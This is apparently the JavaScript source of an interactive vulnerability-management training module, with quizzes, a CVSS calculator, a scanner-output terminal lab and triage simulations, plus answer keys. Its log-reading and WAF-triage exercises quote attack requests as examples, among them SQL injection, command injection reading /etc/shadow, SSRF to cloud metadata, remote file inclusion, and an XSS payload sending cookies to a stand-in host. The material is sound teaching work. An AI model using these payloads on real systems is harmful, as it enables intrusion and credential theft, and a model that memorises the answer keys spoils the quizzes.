 {q:"STRIDE's 'E' stands for:",o:["Elevation of privilege","Encryption","Exfiltration","Exposure"],a:0,e:"Spoofing, Tampering, Repudiation, Information disclosure, DoS, Elevation of privilege."},
 {q:"A written security policy requiring quarterly access reviews is which control category?",o:["Managerial","Technical","Physical","Operational"],a:0,e:"Policies are managerial (administrative)."},
 {q:"Security guards checking badges at a door are which control category?",o:["Operational","Technical","Managerial","Compensating"],a:0,e:"Carried out by people."},
 {q:"An IDS that alerts on attacks is which control function?",o:["Detective","Preventive","Corrective","Deterrent"],a:0,e:"It identifies, it doesn't block."},
 {q:"Restoring a server from backup after ransomware is which control function?",o:["Corrective","Preventive","Detective","Deterrent"],a:0,e:"Fixes the damage."},
 {q:"A legacy system can't be patched, so it's placed on an isolated VLAN with strict ACLs and extra monitoring. What are these?",o:["Compensating controls","Deterrent controls","Directive controls","Physical controls"],a:0,e:"Alternatives when the primary control isn't possible."},
 {q:"A 'Warning: this system is monitored' login banner is which function?",o:["Deterrent","Corrective","Detective","Compensating"],a:0,e:"It discourages misuse."},
 {q:"What should happen right after a patch is deployed?",o:["Validation, such as a rescan","Delete the change ticket","Disable logging","Nothing"],a:0,e:"Confirm the vulnerability is gone."},
 {q:"Why test patches on a pilot group first?",o:["To catch compatibility problems before a broad rollout","To save licenses","Because scanners require it","To skip change management"],a:0,e:"Patches can break things."},
 {q:"A server can't be patched for 60 days because of a vendor dependency. What's the correct process?",o:["Document an exception with an owner, compensating controls and expiry date","Remove the server from the scanner's scope until the vendor releases a fix","Ignore it","Lower its CVSS score"],a:0,e:"Exceptions must be formal and time-bound."},
 {q:"A company buys cyber insurance to cover breach costs. Which risk response?",o:["Transfer","Accept","Avoid","Mitigate"],a:0,e:"Financial impact shifts to the insurer."},
 {q:"A company shuts down a risky legacy FTP service entirely. Which risk response?",o:["Avoid","Transfer","Accept","Mitigate"],a:0,e:"Stop the activity that causes the risk."},
 {q:"Leadership signs off on a low-severity finding because fixing it costs more than the potential loss. Which response?",o:["Accept","Avoid","Transfer","Mitigate"],a:0,e:"Documented acceptance."},
 {q:"A policy says critical vulnerabilities must be fixed within 15 days. What is this?",o:["A remediation SLO/SLA","A KPI for the help desk","A CVSS metric","A rules of engagement clause"],a:0,e:"Service-level objectives set remediation timelines."},
 {q:"Certificate transparency logs reveal 'dev-old.acme.com' that nobody remembers. What practice found it?",o:["Passive discovery for attack surface management","Credentialed vulnerability scanning of the DMZ","Fuzzing","Static analysis"],a:0,e:"Passive discovery doesn't touch the target."},
 {q:"What must be agreed in writing before a penetration test?",o:["Rules of engagement and scope","The final report","The CVSS scores","The patch schedule"],a:0,e:"Authorization, scope and limits."},
 {q:"A red team copies the exact TTPs of a known ransomware group. What is this?",o:["Adversary emulation","Bug bounty","Vulnerability scanning","Tabletop exercise"],a:0,e:"Emulating a specific adversary."},
 {q:"Which BEST reduces the attack surface?",o:["Decommissioning unused internet-facing services","Adding more logs","Buying a SIEM","Raising CVSS thresholds"],a:0,e:"Remove what doesn't need to be exposed."},
 {q:"Which scan finds devices on a subnet by sending ICMP and ARP probes?",o:["Discovery (ping) scan","Credentialed scan","Static analysis","Fuzzing"],a:0,e:"Host discovery."},
 {q:"Nmap shows 22/tcp closed. What does that mean?",o:["The host answered, but nothing listens on 22","A firewall dropped the probe","SSH is vulnerable","The host is down"],a:0,e:"Closed means reachable with no service."},
 {q:"Which Nmap scan type sends SYN and never completes the handshake?",o:["-sS","-sT","-sU","-sn"],a:0,e:"SYN half-open scan."},
 {q:"A scanner flags a vulnerability only from the service banner. What should you do before escalating?",o:["Validate with a credentialed check or manual verification","Patch immediately without checking","Ignore it","Raise the CVSS score"],a:0,e:"Banner checks cause false positives."},
 {q:"What is a key advantage of DAST over SAST?",o:["It finds issues in the running app, including configuration problems","It needs the full source code, so it can trace every input to its sink","It runs before code is written","It never has false positives"],a:0,e:"Dynamic testing sees runtime behavior."},
 {q:"Which secure coding practice BEST stops command injection?",o:["Avoid passing user input to a shell; use safe APIs with allow-listed input","Output encoding of every value the application writes back to the page","Longer passwords for the service account","TLS on every connection"],a:0,e:"Don't build shell commands from input."},
 {q:"Which CVSS metric would be 'Required' for a vulnerability that only triggers when a user opens a crafted file?",o:["User interaction","Privileges required","Scope","Attack complexity"],a:0,e:"UI:R."},
 {q:"Which has the MOST influence on priority for a flaw with a public exploit and active attacks?",o:["Exploitability and weaponization","The CVE number and the year it was published","Scanner vendor","Plugin age"],a:0,e:"Active exploitation raises urgency."},
 {q:"Which control type is a firewall?",o:["Technical, preventive","Managerial, detective","Physical, deterrent","Operational, corrective"],a:0,e:"Technology that blocks."},
 {q:"Security awareness training is which control category?",o:["Operational","Technical","Physical","Compensating"],a:0,e:"People carry it out (some frameworks call training managerial/administrative)."},
 {q:"What is the main risk of skipping patch testing?",o:["The patch may break production systems","Scanners stop working","CVSS scores rise","Licenses expire"],a:0,e:"Test before broad deployment."},
 {q:"Which tool would you use to look for exposed internet-facing devices belonging to your company without scanning them?",o:["Shodan","GDB","Metasploit","Burp Suite"],a:0,e:"Passive discovery search engine."}
];

registerModule({
  id:"vul",slug:"vulnmgmt",title:"Vulnerability Management",
  lessons:LESSONS.map(l=>({...l,short:l.title.split(/[:,]| and /)[0]})),
  decks:DECKS,cards:CARDS,quiz:QUIZ,
  vizKeys:["scantype","scanq","scanterm","toolsort","weblog","owasp","cvss","fpfn","context","codefix","ctlcat","patch","risk","asm"],
  viz(){
sortViz($("#viz-scantype"),{title:"Which kind of scan or test is it?",bins:{cred:"Credentialed",non:"Non-credentialed",pass:"Passive",stat:"Static",dyn:"Dynamic"},
  items:[["Scanner logs in with a service account and reads installed patches","cred","Authenticated view."],["Probe the web server from the internet with no account","non","Outside, unauthenticated view."],["A sensor watches SCADA traffic on a SPAN port","pass","No probes sent."],["SAST tool reviews the Java source in the CI pipeline","stat","Code isn't running."],["Fuzz the running API with malformed JSON","dyn","Tests the live app."],["Disassemble a suspicious binary in a debugger without running it","stat","Reverse engineering is static analysis."],["DAST scanner crawls the staging site","dyn","Running application."],["Fingerprint devices from DHCP and ARP traffic","pass","Listening only."]],done:"Sorted every scan type"});

quizViz($("#viz-scanq"),{title:"Plan the right scan",done:"Planned every scan correctly",qs:[
  ["You need to see what an outside attacker sees on your public IP range.",["External, non-credentialed scan","Internal credentialed scan","Passive OT monitoring","Static code analysis"],0,"The attacker's first view."],
  ["Remote sales laptops rarely connect to the VPN.",["Agent-based scanning","Agentless network scan","External scan","Passive scan"],0,"Agents report from anywhere."],
  ["A water treatment plant's PLCs must not be disrupted.",["Passive monitoring with vendor-approved tools","Aggressive active scan","Fuzzing the PLCs","Nmap -A on the control network"],0,"Safety first in OT."],
  ["The card-processing segment needs its quarterly external scan.",["Scan by an Approved Scanning Vendor","Any free online scanner","A credentialed internal scan only","Skip it if nothing changed"],0,"PCI DSS requirement."],
  ["Scans keep crashing an old ERP service.",["Lower the scan sensitivity and schedule a maintenance window","Stop scanning forever","Run it more often","Scan at peak hours"],0,"Tune sensitivity and timing."]]});

termViz($("#viz-scanterm"),{title:"Analyst terminal: read the scanner output",done:"Worked the scanner output from the command line",prompt:"vm@scanner:~$",
  intro:"Last night's Nessus export is in <span class=\"mono\">scan.csv</span> and the asset list in <span class=\"mono\">assets.csv</span>. You can also run <span class=\"mono\">nmap</span> against a few hosts (try <span class=\"mono\">nmap -sn 10.0.4.0/24</span>, <span class=\"mono\">nmap -sV 10.0.4.88</span>, <span class=\"mono\">nmap -sV -p 21,22,80 10.0.5.12</span>, <span class=\"mono\">nmap --script smb-protocols -p445 10.0.2.30</span>).",
  files:{"scan.csv":SCAN.csv,"assets.csv":SCAN.assets},
  extra:{nmap:a=>{const k=a.join(" ");if(NMAP[k])return "Starting Nmap 7.95\n"+NMAP[k]+"\n";return "Starting Nmap 7.95\n(This lab has canned results for: "+Object.keys(NMAP).map(x=>"nmap "+x).join(" | ")+")\n"}},
  tasks:[
   {t:"How many Critical findings are in scan.csv?",hint:"grep -c Critical scan.csv",ans:String(SCAN.crit)},
   {t:"Which host has a Critical finding that is internet-facing? (check assets.csv)",hint:"grep Critical scan.csv   then   grep internet assets.csv",ans:"10.0.1.10"},
   {t:"Two hosts have SMBv1 (EternalBlue). One is the file server. Which is the other host's IP?",hint:"grep SMBv1 scan.csv",ans:"10.0.5.12"},
   {t:"Confirm SMBv1 on the file server with Nmap.",hint:"nmap --script smb-protocols -p445 10.0.2.30",check:l=>/nmap .*smb-protocols.*10\.0\.2\.30/.test(l)},
   {t:"Run a version scan on 10.0.5.12. Which FTP server version is running? (just the version number)",hint:"nmap -sV -p 21,22,80 10.0.5.12",ans:["2.3.4","vsftpd 2.3.4"]},
   {t:"Which host has the most findings?",hint:"cut -d , -f 1 scan.csv | sort | uniq -c | sort -nr",ans:"10.0.1.20"}],
  end:"Fix order: the KEV-listed VPN gateway first, then the EternalBlue file server. The isolated lab box has the same critical flaw but far less exposure."});

sortViz($("#viz-toolsort"),{title:"Sort the assessment tools",bins:{net:"Network scanning / mapping",web:"Web app scanner",vs:"Vulnerability scanner",dbg:"Debugger",cloud:"Cloud assessment",multi:"Multipurpose"},
  items:[["Angry IP Scanner","net","Fast IP and port sweeps."],["Maltego","net","OSINT relationship mapping."],["Burp Suite","web","Intercepting proxy."],["Nikto","web","Web server checks."],["Arachni","web","Web app scanner."],["OWASP ZAP","web","Open-source web proxy and scanner."],["Nessus","vs","Commercial scanner."],["OpenVAS","vs","Open-source scanner."],["GDB","dbg","GNU debugger."],["Immunity Debugger","dbg","Windows exploit dev."],["Scout Suite","cloud","Multi-cloud audit."],["Prowler","cloud","Cloud best-practice checks."],["Pacu","cloud","AWS exploitation."],["Metasploit","multi","Exploitation framework."],["Recon-ng","multi","Recon framework."],["Nmap","multi","Discovery, versions, scripts."]],done:"Sorted every assessment tool"});

quizViz($("#viz-weblog"),{title:"Read the web server log",done:"Identified every attack in the access log",qs:[
  ["203.0.113.7 \"GET /products.php?id=7%27%20OR%20%271%27=%271 HTTP/1.1\" 200",["SQL injection","XSS","Directory traversal","SSRF"],0,"Decoded: id=7' OR '1'='1, a tautology."],
  ["198.51.100.4 \"GET /help?topic=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1\" 200",["Reflected XSS","SQL injection","LFI","CSRF"],0,"A script tag in a parameter."],
  ["45.9.20.11 \"GET /static/..%2f..%2f..%2fetc%2fpasswd HTTP/1.1\" 200",["Directory traversal","SSRF","RFI","Command injection"],0,"Encoded ../ sequences."],
  ["10.0.9.3 \"POST /api/preview url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\" 200",["SSRF","CSRF","Stored XSS","Integer overflow"],0,"The server fetched the cloud metadata service."],
  ["185.10.4.9 \"GET /ping.php?host=8.8.8.8;cat%20/etc/shadow HTTP/1.1\" 200",["Command injection","SQL injection","Directory traversal","XSS"],0,"A semicolon chains an OS command."],
  ["91.215.85.4 \"GET /index.php?page=http://91.215.85.4/sh.txt HTTP/1.1\" 200",["Remote file inclusion","Local file inclusion","CSRF","SSRF"],0,"The app includes a remote file."]]});

sortViz($("#viz-owasp"),{title:"Name the weakness",bins:{bac:"Broken access control",crypto:"Cryptographic failure",design:"Insecure design",misc:"Misconfiguration",comp:"Outdated component",auth:"Auth failure"},
  items:[["Changing ?account=1001 to 1002 shows another customer","bac","Missing authorization check."],["Card numbers stored in plain text","crypto","Sensitive data unencrypted."],["Coupon logic lets users stack unlimited discounts","design","A business logic flaw."],["Admin console reachable with admin/admin","misc","Default credentials."],["App uses Log4j 2.14 (Log4Shell)","comp","Known-vulnerable library."],["No lockout or rate limit; credential stuffing works","auth","Weak authentication controls."],["Verbose stack traces shown to users","misc","Leaks internals."],["Regular user can reach /admin by typing the URL","bac","Forced browsing."],["Passwords hashed with unsalted MD5","crypto","Weak hashing."],["Sessions never expire, even after logout","auth","Session management failure."]],done:"Named every OWASP weakness"});

/* ---- CVSS 3.1 calculator ---- */
(function(){
  const el=$("#viz-cvss");
  const M={AV:["Attack vector",[["N","Network",.85],["A","Adjacent",.62],["L","Local",.55],["P","Physical",.2]]],AC:["Attack complexity",[["L","Low",.77],["H","High",.44]]],PR:["Privileges required",[["N","None",.85],["L","Low",.62],["H","High",.27]]],UI:["User interaction",[["N","None",.85],["R","Required",.62]]],S:["Scope",[["U","Unchanged",0],["C","Changed",1]]],C:["Confidentiality",[["H","High",.56],["L","Low",.22],["N","None",0]]],I:["Integrity",[["H","High",.56],["L","Low",.22],["N","None",0]]],A:["Availability",[["H","High",.56],["L","Low",.22],["N","None",0]]]};
  const v={AV:"L",AC:"H",PR:"H",UI:"R",S:"U",C:"L",I:"N",A:"N"};const sevSeen=new Set();
  const ru=x=>{const i=Math.round(x*1e5);return i%1e4===0?i/1e5:(Math.floor(i/1e4)+1)/10};
  function score(){const g=k=>M[k][1].find(o=>o[0]===v[k])[2];const ch=v.S==="C";let pr=g("PR");if(ch&&v.PR==="L")pr=.68;if(ch&&v.PR==="H")pr=.5;
    const iss=1-(1-g("C"))*(1-g("I"))*(1-g("A")),imp=ch?7.52*(iss-.029)-3.25*Math.pow(iss-.02,15):6.42*iss,ex=8.22*g("AV")*g("AC")*pr*g("UI");
    if(imp<=0)return 0;return ch?ru(Math.min(1.08*(imp+ex),10)):ru(Math.min(imp+ex,10))}
  const sev=s=>s===0?["None","good"]:s<4?["Low","good"]:s<7?["Medium","warn"]:s<9?["High","bad"]:["Critical","bad"];
  el.innerHTML=`<div class="viz-title">CVSS 3.1 base score calculator</div><div id="cv-rows"></div><div style="display:flex;gap:16px;align-items:baseline;margin-top:8px"><div class="big-num" id="cv-s"></div><b id="cv-l"></b></div><div class="meter"><i id="cv-m"></i></div><div class="s-small mono" id="cv-v" style="word-break:break-all"></div><div class="caption" aria-live="polite">Set the metrics. Build a Low, a Medium, a High and a Critical score.</div>`;
  function draw(){const s=score(),[l,c]=sev(s);
    $("#cv-rows",el).innerHTML=Object.entries(M).map(([k,[n,opts]])=>`<div class="rng-row" style="grid-template-columns:150px 1fr"><span>${n}</span><span class="seg-row" style="margin:0">${opts.map(o=>`<button class="chip" data-k="${k}" data-v="${o[0]}" aria-pressed="${v[k]===o[0]}">${o[1]}</button>`).join("")}</span></div>`).join("");
    $("#cv-s",el).textContent=s.toFixed(1);$("#cv-s",el).className="big-num "+c;$("#cv-l",el).textContent=l;$("#cv-m",el).style.width=s*10+"%";
    $("#cv-v",el).textContent="CVSS:3.1/"+Object.entries(v).map(([k,x])=>k+":"+x).join("/");
    if(l!=="None")sevSeen.add(l);if(sevSeen.size>=4){award("viz:cvss",30,"Built every CVSS severity");$(".caption",el).innerHTML='<span class="status-good">All four severities built.</span> Network vector, no privileges, no user interaction and high impact push a score to critical. The base score ignores your environment, so add context before you prioritize.'}}
  el.addEventListener("click",e=>{const b=e.target.closest("[data-k]");if(!b)return;v[b.dataset.k]=b.dataset.v;draw()});draw();
})();

quizViz($("#viz-fpfn"),{title:"True or false, positive or negative?",done:"Classified every scan result",qs:[
  ["Scanner: \"Apache 2.4.49 path traversal\". The server runs a backported, patched 2.4.49 build from the distro vendor.",["False positive","False negative","True positive","True negative"],0,"Banner-based checks miss backported fixes."],
  ["Scanner: clean. A pen tester then exploits an unpatched Tomcat manager with default creds on that host.",["False negative","False positive","True negative","True positive"],0,"Real, but missed."],
  ["Scanner: \"SMBv1 enabled\". You confirm it with nmap --script smb-protocols.",["True positive","False positive","False negative","True negative"],0,"Reported and confirmed."],
  ["Scanner: nothing found on a hardened, fully patched jump box that truly has no known flaws.",["True negative","False negative","False positive","True positive"],0,"Nothing reported, nothing there."]]});

/* ---- context prioritizer ---- */
(function(){
  const el=$("#viz-context");
  const V=[["CVE-A · CVSS 9.8","Lab server",{exp:"iso",exploit:0,val:1}],["CVE-B · CVSS 7.5","Customer portal",{exp:"ext",exploit:1,val:3}],["CVE-C · CVSS 8.8","HR database",{exp:"int",exploit:0,val:3}],["CVE-D · CVSS 5.3","Intranet wiki",{exp:"int",exploit:0,val:1}]];
  const base=[9.8,7.5,8.8,5.3];let on={exp:false,exploit:false,val:false};
  el.innerHTML=`<div class="viz-title">Add context to the ranking</div><div class="chips"><button class="chip" data-k="exp">Exposure (internet / internal / isolated)</button><button class="chip" data-k="exploit">Exploited in the wild (KEV)</button><button class="chip" data-k="val">Asset value</button></div><div class="bars"></div><div class="caption" aria-live="polite">Ranked by CVSS alone. Turn on each context factor.</div>`;
  function draw(){const sc=V.map((x,i)=>{let s=base[i];const c=x[2];if(on.exp)s*=c.exp==="ext"?1.4:c.exp==="int"?1:.35;if(on.exploit)s*=c.exploit?1.6:1;if(on.val)s*=[0,.7,1,1.3][c.val];return s});
    const ord=V.map((x,i)=>i).sort((a,b)=>sc[b]-sc[a]),mx=Math.max(...sc);
    $(".bars",el).innerHTML=ord.map((i,k)=>`<div class="br"><span>${k+1}. ${V[i][1]}</span><i style="width:${sc[i]/mx*100}%"></i><b>${sc[i].toFixed(1)}</b></div><div class="s-small mono" style="margin:-4px 0 4px">${V[i][0]}</div>`).join("");
    el.querySelectorAll("[data-k]").forEach(b=>b.setAttribute("aria-pressed",on[b.dataset.k]));
    const all=on.exp&&on.exploit&&on.val;$(".caption",el).innerHTML=all?'<span class="status-good">Now the 7.5 on the internet-facing, actively exploited customer portal is first,</span> and the 9.8 on the isolated lab box is last. That\'s risk-based prioritization.':"Turn on every factor and watch the order change.";
    if(all)award("viz:context",30,"Prioritized with context")}
  el.addEventListener("click",e=>{const b=e.target.closest("[data-k]");if(b){on[b.dataset.k]=!on[b.dataset.k];draw()}});draw();
})();

quizViz($("#viz-codefix"),{title:"Pick the secure fix",done:"Fixed every vulnerable snippet",qs:[
  ["query = \"SELECT * FROM users WHERE name='\" + name + \"'\"",["cursor.execute(\"SELECT * FROM users WHERE name=%s\", (name,))","Escape quotes with a regex on the client","Hide SQL errors","Use a longer variable name"],0,"Parameterized queries keep data out of the SQL code."],
  ["html += \"&lt;p&gt;\" + comment + \"&lt;/p&gt;\"",["HTML-encode the comment before inserting it","Store comments in a different table","Use HTTPS","Limit comments to 500 characters"],0,"Output encoding stops stored XSS."],
  ["os.system(\"ping -c 1 \" + host)",["Validate host against an IP/hostname allow-list and call ping without a shell","Add a try/except","Run as root","Log the command"],0,"Never pass user input to a shell."],
  ["Set-Cookie: session=abc123",["Set-Cookie: session=…; Secure; HttpOnly; SameSite=Strict, with a random ID","Make the ID shorter","Store it in localStorage","Put it in the URL"],0,"Protect the session cookie."],
  ["open(\"/var/www/files/\" + request.args[\"f\"])",["Resolve the path and reject anything outside /var/www/files","URL-decode the input twice","Allow only .txt endings","Use a bigger buffer"],0,"Canonicalize the path to stop traversal."]]});

sortViz($("#viz-ctlcat"),{title:"Classify the control by function",bins:{prev:"Preventive",det:"Detective",corr:"Corrective",det2:"Deterrent",comp:"Compensating"},
  items:[["Firewall blocks inbound SMB","prev","Stops it happening."],["SIEM alert on impossible travel","det","Identifies it."],["Restore files from immutable backup","corr","Fixes the damage."],["Login banner warning of prosecution","det2","Discourages it."],["Legacy box isolated on its own VLAN because it can't be patched","comp","An alternative control."],["MFA on VPN logins","prev","Blocks stolen-password logins."],["File integrity monitoring","det","Alerts on change."],["Re-image a compromised laptop","corr","Returns it to a good state."],["Visible security cameras","det2","They also detect, but their deterrent effect is the point here."],["Extra monitoring on an unpatchable server during an exception","comp","Offsets the missing patch."]],done:"Classified every control"});

stepViz($("#viz-patch"),{title:"Patch a critical vulnerability the right way",done:"Patched through change management",steps:[
  ["Identify","The scan shows CVE-2024-3400 on the VPN gateway, CVSS 10, on CISA KEV."],
  ["Change request","An emergency change is raised: risk, plan, rollback, owner and window."],
  ["Test","Apply the fix to the standby gateway first and run the VPN regression tests."],
  ["Implement","Fail over, patch the primary in the maintenance window, fail back."],
  ["Rollback ready","If tunnels don't come back within 15 minutes, restore the saved config and image."],
  ["Validate","Rescan both gateways. The finding is closed. Hunt for signs it was exploited before the patch."],
  ["Report","Update the ticket and the vulnerability dashboard. The SLO was met in 2 days."]],
  end:"Test, implement, keep a rollback, validate. And for actively exploited flaws, check whether you were hit before you patched."});

sortViz($("#viz-risk"),{title:"Accept, transfer, avoid or mitigate?",bins:{acc:"Accept",tr:"Transfer",av:"Avoid",mit:"Mitigate"},
  items:[["Buy cyber insurance for breach response costs","tr","Shifts financial impact."],["Retire the unsupported FTP server instead of fixing it","av","Stop the activity."],["CISO signs off on a low-risk finding on a kiosk","acc","Documented acceptance."],["Deploy a WAF in front of the vulnerable app","mit","Reduces likelihood."],["Contract requires the hosting provider to cover outage losses","tr","Contractual transfer."],["Patch the VPN gateway","mit","Removes the vulnerability."],["Cancel a project to store biometric data","av","Don't take on the risk."],["Leave a medium finding open because the system retires next month","acc","Within appetite, documented."]],done:"Chose every risk response"});

quizViz($("#viz-asm"),{title:"Manage the attack surface",done:"Handled every attack surface question",qs:[
  ["How can you find forgotten subdomains without touching your servers?",["Search certificate transparency logs and passive DNS","Run Nmap -A on the internet","Fuzz every IP","Ask the help desk"],0,"Passive discovery."],
  ["Shodan shows a test database with a public IP and port 5432 open.",["Attack surface reduction: remove the public exposure or decommission it","Accept the risk","Raise its CVSS score","Add a login banner"],0,"Close what doesn't need to be exposed."],
  ["You want to know if your EDR would catch a specific ransomware group's techniques.",["Adversary emulation","Bug bounty","Passive discovery","Risk transfer"],0,"Emulate the actor's TTPs."],
  ["Before a pen test starts, what must exist?",["Written authorization, scope and rules of engagement","A final report","A patch for every CVE","A press release"],0,"Without authorization it's an attack."],
  ["An outside researcher reports a flaw through your published program and gets paid.",["Bug bounty","Adversary emulation","Edge discovery","Tabletop"],0,"Crowdsourced testing."]]});
  },
  sims:[
    {id:"scanplan",type:"choice",title:"Plan the scanning program",
      scenario:"You're building a vulnerability scanning program for a manufacturer with an office network, a public website, a card-processing segment, remote laptops and a factory floor.",
      steps:[
        ["What's the first step?",["Build an asset inventory with discovery scans and fingerprinting","Buy a pen test","Patch everything","Scan the factory with Nmap -A"],0,"Discovery first."],
        ["Office servers need accurate patch data. Which scan?",["Credentialed internal scan","External non-credentialed scan","Passive only","Static analysis"],0,"Logging in sees patch levels."],
        ["Remote laptops?",["Agent-based scanning","Only when they're in the office","External scan of home IPs","Skip them"],0,"Agents report from anywhere."],
        ["The factory floor PLCs?",["Passive monitoring and vendor-approved assessment in a maintenance window","Aggressive active scan at shift change","Fuzz the PLCs","Nothing; OT can't be attacked"],0,"OT safety."],
        ["Card-processing segment?",["Quarterly internal scans plus quarterly external ASV scans, and after major changes","Annual scan by any tool","No scans; it's segmented","Credentialed scan once"],0,"PCI DSS requirements."],
        ["Scans slow the ERP at 10 a.m. Fix?",["Schedule scans in a window and tune sensitivity","Stop scanning the ERP","Scan more often","Remove the ERP from inventory"],0,"Balance coverage and operations."]],
      success:"Right scan, right place, right time."},
    {id:"findings",type:"classify",title:"Work the scan findings",
      scenario:"Five findings from this week's scan. Decide if each is real, then the right disposition.",
      cols:[{k:"v",label:"Validation",opts:[["tp","True positive"],["fp","False positive"]]},{k:"a",label:"Disposition",opts:[["now","Patch now (emergency change)"],["sched","Patch in normal cycle"],["comp","Exception with compensating controls"],["close","Close the finding"]]}],
      rows:[
        {t:"CVE-2024-3400 on vpn-gw",meta:"Critical 10.0 · internet-facing · on CISA KEV",d:"Plugin output: GlobalProtect version 10.2.9 (vulnerable)\nVendor hotfix available\nnmap -sV confirms 10.2.9",ans:{v:"tp",a:"now"},why:"Confirmed, exposed, actively exploited and fixable. Emergency patch."},
        {t:"OpenSSH 8.2 vulnerable (banner check)",meta:"High 7.5 · bastion01",d:"Banner: OpenSSH_8.2p1 Ubuntu-4ubuntu0.11\nUbuntu USN shows the fix was backported in 0.11\nCredentialed check: package patched",ans:{v:"fp",a:"close"},why:"A banner-only check missed the distro backport. Document it and close (or tune the plugin)."},
        {t:"SQL Server 2014 end of support",meta:"High 8.8 · hr-db",d:"Vendor app only certified on SQL 2014; upgrade project in Q2\nHost holds PII; reachable from HR VLAN only",ans:{v:"tp",a:"comp"},why:"Real, but can't be fixed yet. Formal exception: owner, isolation, extra monitoring, expiry date."},
        {t:"TLS 1.0 enabled",meta:"Medium 5.9 · intranet wiki",d:"openssl s_client -tls1 succeeds\nInternal only, no sensitive data",ans:{v:"tp",a:"sched"},why:"Confirmed but low exposure. Fix it in the normal cycle."},
        {t:"Apache Struts RCE",meta:"Critical 9.8 · files01",d:"files01 is a Windows file server; no Java, no Struts, no web server installed\nFinding triggered by a generic URL probe on port 8080 (closed)",ans:{v:"fp",a:"close"},why:"The software isn't even present. False positive."}],
      success:"Validate first, then decide. Not every critical is real, and not every real one can be patched today."},
    {id:"prioritize",type:"order",title:"Prioritize the remediation queue",
      scenario:"You can fix two findings a day. Put them in order, using exploitability, exposure and asset value, not just CVSS.",
      steps:["CVSS 9.8, internet-facing VPN, on CISA KEV, exploit public","CVSS 8.1, domain controller, SMB signing not required, reachable from all workstations","CVSS 7.5, public web shop, TLS 1.0 enabled, card data in scope","CVSS 9.8, isolated lab server with no data, SMBv1","CVSS 5.3, internal wiki, missing security headers","CVSS 3.1, printer on isolated VLAN, default web page"],
      success:"Exposure and active exploitation outrank the raw score. The isolated 9.8 lands below a 7.5 in PCI scope."},
    {id:"cvssscore",type:"choice",title:"Score a vulnerability with CVSS",
      scenario:"A flaw in a web app lets anyone on the internet send a crafted request, with no login and no user action, to read and modify every customer record and crash the service. Build the CVSS 3.1 vector.",
      steps:[
        ["Attack vector?",["Network (N)","Adjacent (A)","Local (L)","Physical (P)"],0,"Anyone on the internet."],
        ["Privileges required?",["None (N)","Low (L)","High (H)"],0,"No login needed."],
        ["User interaction?",["None (N)","Required (R)"],0,"Nobody has to click anything."],
        ["Confidentiality, integrity and availability impact?",["High / High / High","Low / Low / None","None / None / High","Low / High / Low"],0,"Read all, modify all, crash it."],
        ["Assuming low complexity and unchanged scope, what's the severity?",["Critical (9.8)","High (7.5)","Medium (5.3)","Low (3.1)"],0,"AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8."]],
      success:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, a 9.8 critical."},
    {id:"webattacks",type:"classify",title:"Triage the WAF alerts",
      scenario:"The WAF flagged five requests. Name the attack in each one.",
      cols:[{k:"t",label:"Attack",opts:[["sqli","SQL injection"],["xss","XSS"],["trav","Traversal / LFI"],["ssrf","SSRF"],["cmd","Command injection"]]}],
      rows:[
        {t:"Request 1",d:"GET /login.php?user=admin'--&amp;pass=x",ans:{t:"sqli"},why:"The quote and comment cut off the password check."},
        {t:"Request 2",d:"POST /comment body=&lt;img src=x onerror=fetch('//x.tk/?c='+document.cookie)&gt;",ans:{t:"xss"},why:"An event-handler script that steals cookies."},
        {t:"Request 3",d:"GET /view?doc=....//....//....//windows/win.ini",ans:{t:"trav"},why:"Filter-bypass traversal."},
        {t:"Request 4",d:"GET /thumb?src=http://127.0.0.1:8500/v1/kv/?recurse",ans:{t:"ssrf"},why:"Makes the server query an internal service."},
        {t:"Request 5",d:"GET /tools/dns?name=acme.com|whoami",ans:{t:"cmd"},why:"A pipe runs a second OS command."}],
      success:"Five requests, five attack classes. Decoding the parameter is half the work."},
    {id:"remedy",type:"match",title:"Match the fix to the flaw",
      scenario:"Developers asked what to change. Match each vulnerability to the BEST fix.",
      items:[["Parameterized queries","pq"],["Output encoding","oe"],["Anti-CSRF tokens","csrf"],["Allow-list outbound URLs and block metadata IPs","ssrf"],["Object-level authorization checks","idor"],["Upgrade the library using the SBOM","sbom"]],
      slots:[["pq","SQL injection","Search box concatenates input into SQL"],["oe","Stored XSS","Profile bio renders raw HTML"],["csrf","CSRF","Email change form has no token"],["ssrf","SSRF","Image fetcher reaches 169.254.169.254"],["idor","IDOR","/api/orders/{id} returns any order"],["sbom","Outdated component","Log4j 2.14 in three services"]],
      success:"Each class of flaw has a standard fix."},
    {id:"riskdecide",type:"choice",title:"Decide what to do with the risk",
      scenario:"The quarterly risk review has four open items. Choose the right response for each.",
      steps:[
        ["An unsupported kiosk in the lobby with no data and no network access beyond the internet. Fixing costs $40k.",["Accept, documented and signed off","Transfer","Avoid by stopping all business","Ignore without a record"],0,"Low risk, high cost to fix: formal acceptance."],
        ["Ransomware recovery could cost millions.",["Transfer part of it with cyber insurance, and mitigate with backups","Accept it","Avoid computers","Raise CVSS scores"],0,"Insurance transfers the financial impact."],
        ["A legacy FTP server is used by one partner who now supports SFTP.",["Avoid: retire FTP","Accept","Transfer","Add a banner"],0,"Remove the risky activity."],
        ["The customer portal has a critical flaw with a patch available.",["Mitigate: patch it","Accept","Transfer","Avoid customers"],0,"Reduce the risk."]],
      success:"Accept, transfer, avoid, mitigate: each has its place."}
  ],
  badges:[
    ["reader","VM","Patch Tuesday","Mark all 8 vulnerability management lessons studied",c=>c.allStudied()],
    ["lab","SC","Scanner Room","Complete all 14 diagrams in this module",c=>c.vizAll()],
    ["term","NM","Output Reader","Finish the scanner output terminal lab",c=>c.earned("viz:scanterm")],
    ["cvss","CV","Severity Scale","Build every CVSS severity in the calculator",c=>c.earned("viz:cvss")],
    ["ctx","RB","Risk-Based","Re-rank vulnerabilities with full context",c=>c.earned("viz:context")],
    ["fp","FP","False Alarm","Pass the scan findings simulation",c=>c.passed("findings")],
    ["waf","WF","Request Decoder","Pass the WAF alert triage",c=>c.passed("webattacks")],
    ["score","98","Nine Point Eight","Pass the CVSS scoring simulation",c=>c.passed("cvssscore")],
    ["sims","VR","Remediation Ready","Pass all 7 vulnerability management simulations",c=>["scanplan","findings","prioritize","cvssscore","webattacks","remedy","riskdecide"].every(c.passed)],
    ["perfect","ZV","Zero Vulns","Score 100% on a vulnerability management quiz of 15+ questions",c=>c.earned("quiz100")]
  ]
